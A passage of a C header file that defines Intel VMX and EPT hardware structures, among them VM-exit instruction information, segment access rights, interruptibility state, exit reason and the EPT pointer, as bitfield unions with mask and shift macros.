    /**
     * @brief Address size
     *
     * [Bits 9:7] 0: 16-bit
     * 1: 32-bit
     * 2: 64-bit (used only on processors that support Intel 64 architecture)
     * Other values not used.
     */
    UINT64 AddressSize : 3;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_ADDRESS_SIZE_BIT 7
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_ADDRESS_SIZE_FLAG 0x380
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_ADDRESS_SIZE_MASK 0x07
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_ADDRESS_SIZE(_) (((_) >> 7) & 0x07)
    UINT64 Reserved2 : 5;

    /**
     * @brief Segment register
     *
     * [Bits 17:15] 0: ES
     * 1: CS
     * 2: SS
     * 3: DS
     * 4: FS
     * 5: GS
     * Other values not used.
     */
    UINT64 SegmentRegister : 3;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_SEGMENT_REGISTER_BIT 15
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_SEGMENT_REGISTER_FLAG 0x38000
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_SEGMENT_REGISTER_MASK 0x07
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_SEGMENT_REGISTER(_) (((_) >> 15) & 0x07)

    /**
     * [Bits 21:18] General-purpose register. Undefined for instructions with no index register (bit
     * 22 is set).
     */
    UINT64 GeneralPurposeRegister : 4;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_GENERAL_PURPOSE_REGISTER_BIT 18
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_GENERAL_PURPOSE_REGISTER_FLAG 0x3C0000
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_GENERAL_PURPOSE_REGISTER_MASK 0x0F
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_GENERAL_PURPOSE_REGISTER(_) (((_) >> 18) & 0x0F)

    /**
     * [Bit 22] IndexReg invalid (0 = valid; 1 = invalid).
     */
    UINT64 GeneralPurposeRegisterInvalid : 1;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_GENERAL_PURPOSE_REGISTER_INVALID_BIT 22
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_GENERAL_PURPOSE_REGISTER_INVALID_FLAG 0x400000
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_GENERAL_PURPOSE_REGISTER_INVALID_MASK 0x01
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_GENERAL_PURPOSE_REGISTER_INVALID(_) \
  (((_) >> 22) & 0x01)

    /**
     * [Bits 26:23] BaseReg (encoded as IndexReg above). Undefined for memory instructions with no
     * base register (bit 27 is set).
     */
    UINT64 BaseRegister : 4;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_BASE_REGISTER_BIT 23
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_BASE_REGISTER_FLAG 0x7800000
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_BASE_REGISTER_MASK 0x0F
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_BASE_REGISTER(_) (((_) >> 23) & 0x0F)

    /**
     * [Bit 27] BaseReg invalid (0 = valid; 1 = invalid).
     */
    UINT64 BaseRegisterInvalid : 1;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_BASE_REGISTER_INVALID_BIT 27
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_BASE_REGISTER_INVALID_FLAG 0x8000000
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_BASE_REGISTER_INVALID_MASK 0x01
#define VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES_BASE_REGISTER_INVALID(_) (((_) >> 27) & 0x01)
    UINT64 Reserved3 : 36;
  };

  UINT64 Flags;
} VMX_VMEXIT_INSTRUCTION_INFO_VMX_AND_XSAVES;

/**
 * @brief VM-Exit Instruction-Information Field as Used for VMREAD and VMWRITE
 */
typedef union {
  struct {
    /**
     * @brief Scaling
     *
     * [Bits 1:0] 0: no scaling
     * 1: scale by 2
     * 2: scale by 4
     * 3: scale by 8 (used only on processors that support Intel 64 architecture)
     * Undefined for register instructions (bit 10 is set) and for memory instructions with no index
     * register (bit 10 is clear and bit 22 is set).
     */
    UINT64 Scaling : 2;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_SCALING_BIT 0
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_SCALING_FLAG 0x03
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_SCALING_MASK 0x03
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_SCALING(_) (((_) >> 0) & 0x03)
    UINT64 Reserved1 : 1;

    /**
     * [Bits 6:3] Reg1. Undefined for memory instructions (bit 10 is clear).
     */
    UINT64 Register1 : 4;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_REGISTER_1_BIT 3
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_REGISTER_1_FLAG 0x78
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_REGISTER_1_MASK 0x0F
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_REGISTER_1(_) (((_) >> 3) & 0x0F)

    /**
     * @brief Address size
     *
     * [Bits 9:7] 0: 16-bit
     * 1: 32-bit
     * 2: 64-bit (used only on processors that support Intel 64 architecture)
     * Other values not used. Undefined for register instructions (bit 10 is set).
     */
    UINT64 AddressSize : 3;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_ADDRESS_SIZE_BIT 7
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_ADDRESS_SIZE_FLAG 0x380
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_ADDRESS_SIZE_MASK 0x07
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_ADDRESS_SIZE(_) (((_) >> 7) & 0x07)

    /**
     * [Bit 10] Mem/Reg (0 = memory; 1 = register).
     */
    UINT64 MemoryRegister : 1;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_MEMORY_REGISTER_BIT 10
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_MEMORY_REGISTER_FLAG 0x400
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_MEMORY_REGISTER_MASK 0x01
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_MEMORY_REGISTER(_) (((_) >> 10) & 0x01)
    UINT64 Reserved2 : 4;

    /**
     * @brief Segment register
     *
     * [Bits 17:15] 0: ES
     * 1: CS
     * 2: SS
     * 3: DS
     * 4: FS
     * 5: GS
     * Other values not used. Undefined for register instructions (bit 10 is set).
     */
    UINT64 SegmentRegister : 3;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_SEGMENT_REGISTER_BIT 15
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_SEGMENT_REGISTER_FLAG 0x38000
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_SEGMENT_REGISTER_MASK 0x07
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_SEGMENT_REGISTER(_) (((_) >> 15) & 0x07)

    /**
     * [Bits 21:18] General-purpose register. Undefined for register instructions (bit 10 is set)
     * and for memory instructions with no index register (bit 10 is clear and bit 22 is set).
     */
    UINT64 GeneralPurposeRegister : 4;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_GENERAL_PURPOSE_REGISTER_BIT 18
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_GENERAL_PURPOSE_REGISTER_FLAG 0x3C0000
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_GENERAL_PURPOSE_REGISTER_MASK 0x0F
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_GENERAL_PURPOSE_REGISTER(_) (((_) >> 18) & 0x0F)

    /**
     * [Bit 22] IndexReg invalid (0 = valid; 1 = invalid). Undefined for register instructions (bit
     * 10 is set).
     */
    UINT64 GeneralPurposeRegisterInvalid : 1;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_GENERAL_PURPOSE_REGISTER_INVALID_BIT 22
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_GENERAL_PURPOSE_REGISTER_INVALID_FLAG 0x400000
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_GENERAL_PURPOSE_REGISTER_INVALID_MASK 0x01
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_GENERAL_PURPOSE_REGISTER_INVALID(_) \
  (((_) >> 22) & 0x01)

    /**
     * [Bits 26:23] BaseReg (encoded as Reg1 above). Undefined for register instructions (bit 10 is
     * set) and for memory instructions with no base register (bit 10 is clear and bit 27 is set).
     */
    UINT64 BaseRegister : 4;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_BASE_REGISTER_BIT 23
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_BASE_REGISTER_FLAG 0x7800000
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_BASE_REGISTER_MASK 0x0F
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_BASE_REGISTER(_) (((_) >> 23) & 0x0F)

    /**
     * [Bit 27] BaseReg invalid (0 = valid; 1 = invalid).
     */
    UINT64 BaseRegisterInvalid : 1;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_BASE_REGISTER_INVALID_BIT 27
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_BASE_REGISTER_INVALID_FLAG 0x8000000
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_BASE_REGISTER_INVALID_MASK 0x01
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_BASE_REGISTER_INVALID(_) (((_) >> 27) & 0x01)

    /**
     * [Bits 31:28] Reg2 (same encoding as IndexReg above).
     */
    UINT64 Register2 : 4;
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_REGISTER_2_BIT 28
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_REGISTER_2_FLAG 0xF0000000
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_REGISTER_2_MASK 0x0F
#define VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE_REGISTER_2(_) (((_) >> 28) & 0x0F)
    UINT64 Reserved3 : 32;
  };

  UINT64 Flags;
} VMX_VMEXIT_INSTRUCTION_INFO_VMREAD_VMWRITE;

/**
 * @}
 */

/**
 * @brief - The low 16 bits correspond to bits 23:8 of the upper 32 bits of a 64-bit segment
 * descriptor. While bits 19:16 of code-segment and data-segment descriptors correspond to the upper
 * 4 bits of the segment limit, the corresponding bits (bits 11:8) are reserved in this VMCS field.
 *        - Bit 16 indicates an unusable segment. Attempts to use such a segment fault except in
 * 64-bit mode. In general, a segment register is unusable if it has been loaded with a null
 * selector.
 *        - Bits 31:17 are reserved
 *
 * @note There are a few exceptions to this statement. For example, a segment with a non-null
 * selector may be unusable following a task switch that fails after its commit point. In contrast,
 * the TR register is usable after processor reset despite having a null selector
 * @see SEGMENT_DESCRIPTOR_32
 * @see SEGMENT_DESCRIPTOR_64
 * @see XXX_ACCESS_RIGHTS fields of 32_BIT_GUEST_STATE_FIELDS
 * @see Vol3C[24.4.2(Guest Non-Register State)] (reference)
 */
typedef union {
  struct {
    /**
     * [Bits 3:0] Segment type.
     */
    UINT32 Type : 4;
#define VMX_SEGMENT_ACCESS_RIGHTS_TYPE_BIT 0
#define VMX_SEGMENT_ACCESS_RIGHTS_TYPE_FLAG 0x0F
#define VMX_SEGMENT_ACCESS_RIGHTS_TYPE_MASK 0x0F
#define VMX_SEGMENT_ACCESS_RIGHTS_TYPE(_) (((_) >> 0) & 0x0F)

    /**
     * [Bit 4] S - Descriptor type (0 = system; 1 = code or data).
     */
    UINT32 DescriptorType : 1;
#define VMX_SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_TYPE_BIT 4
#define VMX_SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_TYPE_FLAG 0x10
#define VMX_SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_TYPE_MASK 0x01
#define VMX_SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_TYPE(_) (((_) >> 4) & 0x01)

    /**
     * [Bits 6:5] DPL - Descriptor privilege level.
     */
    UINT32 DescriptorPrivilegeLevel : 2;
#define VMX_SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_PRIVILEGE_LEVEL_BIT 5
#define VMX_SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_PRIVILEGE_LEVEL_FLAG 0x60
#define VMX_SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_PRIVILEGE_LEVEL_MASK 0x03
#define VMX_SEGMENT_ACCESS_RIGHTS_DESCRIPTOR_PRIVILEGE_LEVEL(_) (((_) >> 5) & 0x03)

    /**
     * [Bit 7] P - Segment present.
     */
    UINT32 Present : 1;
#define VMX_SEGMENT_ACCESS_RIGHTS_PRESENT_BIT 7
#define VMX_SEGMENT_ACCESS_RIGHTS_PRESENT_FLAG 0x80
#define VMX_SEGMENT_ACCESS_RIGHTS_PRESENT_MASK 0x01
#define VMX_SEGMENT_ACCESS_RIGHTS_PRESENT(_) (((_) >> 7) & 0x01)
    UINT32 Reserved1 : 4;

    /**
     * [Bit 12] AVL - Available for use by system software.
     */
    UINT32 AvailableBit : 1;
#define VMX_SEGMENT_ACCESS_RIGHTS_AVAILABLE_BIT_BIT 12
#define VMX_SEGMENT_ACCESS_RIGHTS_AVAILABLE_BIT_FLAG 0x1000
#define VMX_SEGMENT_ACCESS_RIGHTS_AVAILABLE_BIT_MASK 0x01
#define VMX_SEGMENT_ACCESS_RIGHTS_AVAILABLE_BIT(_) (((_) >> 12) & 0x01)

    /**
     * [Bit 13] Reserved (except for CS). L - 64-bit mode active (for CS only).
     */
    UINT32 LongMode : 1;
#define VMX_SEGMENT_ACCESS_RIGHTS_LONG_MODE_BIT 13
#define VMX_SEGMENT_ACCESS_RIGHTS_LONG_MODE_FLAG 0x2000
#define VMX_SEGMENT_ACCESS_RIGHTS_LONG_MODE_MASK 0x01
#define VMX_SEGMENT_ACCESS_RIGHTS_LONG_MODE(_) (((_) >> 13) & 0x01)

    /**
     * [Bit 14] D/B - Default operation size (0 = 16-bit segment; 1 = 32-bit segment).
     */
    UINT32 DefaultBig : 1;
#define VMX_SEGMENT_ACCESS_RIGHTS_DEFAULT_BIG_BIT 14
#define VMX_SEGMENT_ACCESS_RIGHTS_DEFAULT_BIG_FLAG 0x4000
#define VMX_SEGMENT_ACCESS_RIGHTS_DEFAULT_BIG_MASK 0x01
#define VMX_SEGMENT_ACCESS_RIGHTS_DEFAULT_BIG(_) (((_) >> 14) & 0x01)

    /**
     * [Bit 15] G - Granularity.
     */
    UINT32 Granularity : 1;
#define VMX_SEGMENT_ACCESS_RIGHTS_GRANULARITY_BIT 15
#define VMX_SEGMENT_ACCESS_RIGHTS_GRANULARITY_FLAG 0x8000
#define VMX_SEGMENT_ACCESS_RIGHTS_GRANULARITY_MASK 0x01
#define VMX_SEGMENT_ACCESS_RIGHTS_GRANULARITY(_) (((_) >> 15) & 0x01)

    /**
     * [Bit 16] Segment unusable (0 = usable; 1 = unusable).
     */
    UINT32 Unusable : 1;
#define VMX_SEGMENT_ACCESS_RIGHTS_UNUSABLE_BIT 16
#define VMX_SEGMENT_ACCESS_RIGHTS_UNUSABLE_FLAG 0x10000
#define VMX_SEGMENT_ACCESS_RIGHTS_UNUSABLE_MASK 0x01
#define VMX_SEGMENT_ACCESS_RIGHTS_UNUSABLE(_) (((_) >> 16) & 0x01)
    UINT32 Reserved2 : 15;
  };

  UINT32 Flags;
} VMX_SEGMENT_ACCESS_RIGHTS;

/**
 * @brief The IA-32 architecture includes features that permit certain events to be blocked for a
 * period of time. This field contains information about such blocking
 *
 * @see INTERRUPTIBILITY_STATE of 32_BIT_GUEST_STATE_FIELDS
 * @see Vol3C[24.4.2(Guest Non-Register State)] (reference)
 */
typedef union {
  struct {
    /**
     * [Bit 0] Execution of STI with RFLAGS.IF = 0 blocks maskable interrupts on the instruction
     * boundary following its execution.1 Setting this bit indicates that this blocking is in
     * effect.
     *
     * @see Vol2B[4(STI-Set Interrupt Flag)]
     */
    UINT32 BlockingBySti : 1;
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_STI_BIT 0
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_STI_FLAG 0x01
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_STI_MASK 0x01
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_STI(_) (((_) >> 0) & 0x01)

    /**
     * [Bit 1] Execution of a MOV to SS or a POP to SS blocks or suppresses certain debug exceptions
     * as well as interrupts (maskable and nonmaskable) on the instruction boundary following its
     * execution. Setting this bit indicates that this blocking is in effect. This document uses the
     * term "blocking by MOV SS," but it applies equally to POP SS.
     *
     * @see Vol3A[6.8.3(Masking Exceptions and Interrupts When Switching Stacks)]
     */
    UINT32 BlockingByMovSs : 1;
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_MOV_SS_BIT 1
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_MOV_SS_FLAG 0x02
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_MOV_SS_MASK 0x01
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_MOV_SS(_) (((_) >> 1) & 0x01)

    /**
     * [Bit 2] System-management interrupts (SMIs) are disabled while the processor is in
     * system-management mode (SMM). Setting this bit indicates that blocking of SMIs is in effect.
     *
     * @see Vol3C[34.2(System Management Interrupt (SMI))]
     */
    UINT32 BlockingBySmi : 1;
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_SMI_BIT 2
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_SMI_FLAG 0x04
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_SMI_MASK 0x01
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_SMI(_) (((_) >> 2) & 0x01)

    /**
     * [Bit 3] Delivery of a non-maskable interrupt (NMI) or a system-management interrupt (SMI)
     * blocks subsequent NMIs until the next execution of IRET. Setting this bit indicates that
     * blocking of NMIs is in effect. Clearing this bit does not imply that NMIs are not
     * (temporarily) blocked for other reasons. If the "virtual NMIs" VM-execution control is 1,
     * this bit does not control the blocking of NMIs. Instead, it refers to "virtual-NMI blocking"
     * (the fact that guest software is not ready for an NMI).
     *
     * @see Vol3C[6.7.1(Handling Multiple NMIs)]
     * @see Vol3C[25.3(CHANGES TO INSTRUCTION BEHAVIOR IN VMX NON-ROOT OPERATION)]
     * @see Vol3C[24.6.1(Pin-Based VM-Execution Controls)]
     */
    UINT32 BlockingByNmi : 1;
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_NMI_BIT 3
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_NMI_FLAG 0x08
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_NMI_MASK 0x01
#define VMX_INTERRUPTIBILITY_STATE_BLOCKING_BY_NMI(_) (((_) >> 3) & 0x01)

    /**
     * [Bit 4] A VM exit saves this bit as 1 to indicate that the VM exit was incident to enclave
     * mode.
     */
    UINT32 EnclaveInterruption : 1;
#define VMX_INTERRUPTIBILITY_STATE_ENCLAVE_INTERRUPTION_BIT 4
#define VMX_INTERRUPTIBILITY_STATE_ENCLAVE_INTERRUPTION_FLAG 0x10
#define VMX_INTERRUPTIBILITY_STATE_ENCLAVE_INTERRUPTION_MASK 0x01
#define VMX_INTERRUPTIBILITY_STATE_ENCLAVE_INTERRUPTION(_) (((_) >> 4) & 0x01)
    UINT32 Reserved1 : 27;
  };

  UINT32 Flags;
} VMX_INTERRUPTIBILITY_STATE;

typedef enum {
  /**
   * The logical processor is executing instructions normally.
   */
  VmxActive = 0x00000000,

  /**
   * The logical processor is inactive because it executed the HLT instruction.
   */
  VmxHlt = 0x00000001,

  /**
   * The logical processor is inactive because it incurred a triple fault1 or some other serious
   * error.
   */
  VmxShutdown = 0x00000002,

  /**
   * The logical processor is inactive because it is waiting for a startup-IPI (SIPI).
   */
  VmxWaitForSipi = 0x00000003,
} VMX_GUEST_ACTIVITY_STATE;

/**
 * @}
 */

/**
 * @brief Format of Exit Reason
 *
 * Exit reason (32 bits). This field encodes the reason for the VM exit and has the structure.
 *
 * @see Vol3C[24.9.1(Basic VM-Exit Information)] (reference)
 */
typedef union {
  struct {
    /**
     * [Bits 15:0] Provides basic information about the cause of the VM exit (if bit 31 is clear) or
     * of the VM-entry failure (if bit 31 is set).
     */
    UINT32 BasicExitReason : 16;
#define VMX_VMEXIT_REASON_BASIC_EXIT_REASON_BIT 0
#define VMX_VMEXIT_REASON_BASIC_EXIT_REASON_FLAG 0xFFFF
#define VMX_VMEXIT_REASON_BASIC_EXIT_REASON_MASK 0xFFFF
#define VMX_VMEXIT_REASON_BASIC_EXIT_REASON(_) (((_) >> 0) & 0xFFFF)

    /**
     * [Bit 16] Always cleared to 0.
     */
    UINT32 Always0 : 1;
#define VMX_VMEXIT_REASON_ALWAYS0_BIT 16
#define VMX_VMEXIT_REASON_ALWAYS0_FLAG 0x10000
#define VMX_VMEXIT_REASON_ALWAYS0_MASK 0x01
#define VMX_VMEXIT_REASON_ALWAYS0(_) (((_) >> 16) & 0x01)
    UINT32 Reserved1 : 10;
#define VMX_VMEXIT_REASON_RESERVED1_BIT 17
#define VMX_VMEXIT_REASON_RESERVED1_FLAG 0x7FE0000
#define VMX_VMEXIT_REASON_RESERVED1_MASK 0x3FF
#define VMX_VMEXIT_REASON_RESERVED1(_) (((_) >> 17) & 0x3FF)

    /**
     * [Bit 27] A VM exit saves this bit as 1 to indicate that the VM exit was incident to enclave
     * mode.
     */
    UINT32 EnclaveMode : 1;
#define VMX_VMEXIT_REASON_ENCLAVE_MODE_BIT 27
#define VMX_VMEXIT_REASON_ENCLAVE_MODE_FLAG 0x8000000
#define VMX_VMEXIT_REASON_ENCLAVE_MODE_MASK 0x01
#define VMX_VMEXIT_REASON_ENCLAVE_MODE(_) (((_) >> 27) & 0x01)

    /**
     * [Bit 28] Pending MTF VM exit.
     */
    UINT32 PendingMtfVmExit : 1;
#define VMX_VMEXIT_REASON_PENDING_MTF_VM_EXIT_BIT 28
#define VMX_VMEXIT_REASON_PENDING_MTF_VM_EXIT_FLAG 0x10000000
#define VMX_VMEXIT_REASON_PENDING_MTF_VM_EXIT_MASK 0x01
#define VMX_VMEXIT_REASON_PENDING_MTF_VM_EXIT(_) (((_) >> 28) & 0x01)

    /**
     * [Bit 29] VM exit from VMX root operation.
     */
    UINT32 VmExitFromVmxRoor : 1;
#define VMX_VMEXIT_REASON_VM_EXIT_FROM_VMX_ROOR_BIT 29
#define VMX_VMEXIT_REASON_VM_EXIT_FROM_VMX_ROOR_FLAG 0x20000000
#define VMX_VMEXIT_REASON_VM_EXIT_FROM_VMX_ROOR_MASK 0x01
#define VMX_VMEXIT_REASON_VM_EXIT_FROM_VMX_ROOR(_) (((_) >> 29) & 0x01)
    UINT32 Reserved2 : 1;
#define VMX_VMEXIT_REASON_RESERVED2_BIT 30
#define VMX_VMEXIT_REASON_RESERVED2_FLAG 0x40000000
#define VMX_VMEXIT_REASON_RESERVED2_MASK 0x01
#define VMX_VMEXIT_REASON_RESERVED2(_) (((_) >> 30) & 0x01)

    /**
     * [Bit 31] VM-entry failure:
     *   - 0 = true VM exit
     *   - 1 = VM-entry failure
     */
    UINT32 VmEntryFailure : 1;
#define VMX_VMEXIT_REASON_VM_ENTRY_FAILURE_BIT 31
#define VMX_VMEXIT_REASON_VM_ENTRY_FAILURE_FLAG 0x80000000
#define VMX_VMEXIT_REASON_VM_ENTRY_FAILURE_MASK 0x01
#define VMX_VMEXIT_REASON_VM_ENTRY_FAILURE(_) (((_) >> 31) & 0x01)
  };

  UINT32 Flags;
} VMX_VMEXIT_REASON;

typedef struct {
#define IO_BITMAP_A_MIN 0x00000000
#define IO_BITMAP_A_MAX 0x00007FFF
#define IO_BITMAP_B_MIN 0x00008000
#define IO_BITMAP_B_MAX 0x0000FFFF
  UINT8 IoA[4096];
  UINT8 IoB[4096];
} VMX_IO_BITMAP;

typedef struct {
#define MSR_ID_LOW_MIN 0x00000000
#define MSR_ID_LOW_MAX 0x00001FFF
#define MSR_ID_HIGH_MIN 0xC0000000
#define MSR_ID_HIGH_MAX 0xC0001FFF
  UINT8 RdmsrLow[1024];
  UINT8 RdmsrHigh[1024];
  UINT8 WrmsrLow[1024];
  UINT8 WrmsrHigh[1024];
} VMX_MSR_BITMAP;

/**
 * @defgroup EPT \
 *           The extended page-table mechanism
 *
 * The extended page-table mechanism (EPT) is a feature that can be used to support the
 * virtualization of physical memory. When EPT is in use, certain addresses that would normally be
 * treated as physical addresses (and used to access memory) are instead treated as guest-physical
 * addresses. Guest-physical addresses are translated by traversing a set of EPT paging structures
 * to produce physical addresses that are used to access memory.
 *
 * @see Vol3C[28.2(THE EXTENDED PAGE TABLE MECHANISM (EPT))] (reference)
 * @{
 */
/**
 * @brief Extended-Page-Table Pointer (EPTP)
 *
 * The extended-page-table pointer (EPTP) contains the address of the base of EPT PML4 table, as
 * well as other EPT configuration information.
 *
 * @see Vol3C[28.2.2(EPT Translation Mechanism]
 * @see Vol3C[24.6.11(Extended-Page-Table Pointer (EPTP)] (reference)
 */
typedef union {
  struct {
    /**
     * [Bits 2:0] EPT paging-structure memory type:
     * - 0 = Uncacheable (UC)
     * - 6 = Write-back (WB)
     * Other values are reserved.
     *
     * @see Vol3C[28.2.6(EPT and memory Typing)]
     */
    UINT64 MemoryType : 3;
#define EPT_POINTER_MEMORY_TYPE_BIT 0
#define EPT_POINTER_MEMORY_TYPE_FLAG 0x07
#define EPT_POINTER_MEMORY_TYPE_MASK 0x07
#define EPT_POINTER_MEMORY_TYPE(_) (((_) >> 0) & 0x07)

    /**
     * [Bits 5:3] This value is 1 less than the EPT page-walk length.
     *
     * @see Vol3C[28.2.6(EPT and memory Typing)]
     */
    UINT64 PageWalkLength : 3;
#define EPT_POINTER_PAGE_WALK_LENGTH_BIT 3
#define EPT_POINTER_PAGE_WALK_LENGTH_FLAG 0x38
#define EPT_POINTER_PAGE_WALK_LENGTH_MASK 0x07
#define EPT_POINTER_PAGE_WALK_LENGTH(_) (((_) >> 3) & 0x07)
#define EPT_PAGE_WALK_LENGTH_4 0x00000003

    /**
     * [Bit 6] Setting this control to 1 enables accessed and dirty flags for EPT.
     *
     * @see Vol3C[28.2.4(Accessed and Dirty Flags for EPT)]
     */
    UINT64 EnableAccessAndDirtyFlags : 1;
#define EPT_POINTER_ENABLE_ACCESS_AND_DIRTY_FLAGS_BIT 6
#define EPT_POINTER_ENABLE_ACCESS_AND_DIRTY_FLAGS_FLAG 0x40
#define EPT_POINTER_ENABLE_ACCESS_AND_DIRTY_FLAGS_MASK 0x01
#define EPT_POINTER_ENABLE_ACCESS_AND_DIRTY_FLAGS(_) (((_) >> 6) & 0x01)
    UINT64 Reserved1 : 5;

    /**
     * [Bits 47:12] Bits N-1:12 of the physical address of the 4-KByte aligned EPT PML4 table.
     */
    UINT64 PageFrameNumber : 36;
#define EPT_POINTER_PAGE_FRAME_NUMBER_BIT 12
#define EPT_POINTER_PAGE_FRAME_NUMBER_FLAG 0xFFFFFFFFF000
#define EPT_POINTER_PAGE_FRAME_NUMBER_MASK 0xFFFFFFFFF
#define EPT_POINTER_PAGE_FRAME_NUMBER(_) (((_) >> 12) & 0xFFFFFFFFF)
    UINT64 Reserved2 : 16;
  };

  UINT64 Flags;
} EPT_POINTER;

/**
 * @brief Format of an EPT PML4 Entry (PML4E) that References an EPT Page-Directory-Pointer Table
 *
 * A 4-KByte naturally aligned EPT PML4 table is located at the physical address specified in bits
 * 51:12 of the extended-page-table pointer (EPTP), a VM-execution control field. An EPT PML4 table
 * comprises 512 64-bit entries (EPT PML4Es). An EPT PML4E is selected using the physical address
 * defined as follows:
 * - Bits 63:52 are all 0.
 * - Bits 51:12 are from the EPTP.
 * - Bits 11:3 are bits 47:39 of the guest-physical address.
 * - Bits 2:0 are all 0.
 * Because an EPT PML4E is identified using bits 47:39 of the guest-physical address, it controls
 * access to a 512- GByte region of the guest-physical-address space.
 *
 * @see Vol3C[24.6.11(Extended-Page-Table Pointer (EPTP)]
 */
typedef union {
  struct {
    /**
     * [Bit 0] Read access; indicates whether reads are allowed from the 512-GByte region controlled
     * by this entry.
     */
    UINT64 ReadAccess : 1;
#define EPT_PML4_READ_ACCESS_BIT 0
#define EPT_PML4_READ_ACCESS_FLAG 0x01
#define EPT_PML4_READ_ACCESS_MASK 0x01
#define EPT_PML4_READ_ACCESS(_) (((_) >> 0) & 0x01)

    /**
